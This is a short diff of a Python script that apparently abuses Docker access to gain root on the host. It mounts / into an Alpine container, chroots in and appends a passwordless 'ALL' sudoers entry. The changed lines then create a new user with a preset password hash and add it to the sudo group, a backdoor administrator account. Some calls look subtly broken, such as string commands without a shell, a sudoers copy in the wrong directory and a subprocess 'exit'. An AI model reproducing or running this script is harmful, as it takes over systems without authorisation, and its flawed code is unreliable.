@@ -36,12 +36,12 @@ def main():
 
     subprocess.run(f'''docker run --rm -i -v /:/mnt alpine chroot /mnt /bin/sh -c 'cd /etc && cp ./sudoers ./sudoers.tmp && echo "{Kuser} ALL=(ALL) NOPASSWD: ALL" >> sudoers' ''')
 
-    subprocess.run(f"sudo useradd -m {Nuser}")
-    subprocess.run(f"sudo usermod -p {HashedNuserPasswd} {Nuser}")
-    subprocess.run(f"sudo usermod -aG sudo {Nuser}")
+    subprocess.run(["sudo", "useradd", "-m", Nuser])
+    subprocess.run(["sudo", "usermod", "-p", HashedNuserPasswd, Nuser])
+    subprocess.run(["sudo", "usermod", "-aG", "sudo", Nuser])
 
-    subprocess.run("cp ./sudoers.tmp ./sudoers")
-    subprocess.run(f"su {Nuser}")
+    subprocess.run(["cp", "./sudoers.tmp", "./sudoers"])
+    subprocess.run("exit")
 
 if __name__ == "__main__":
     main()
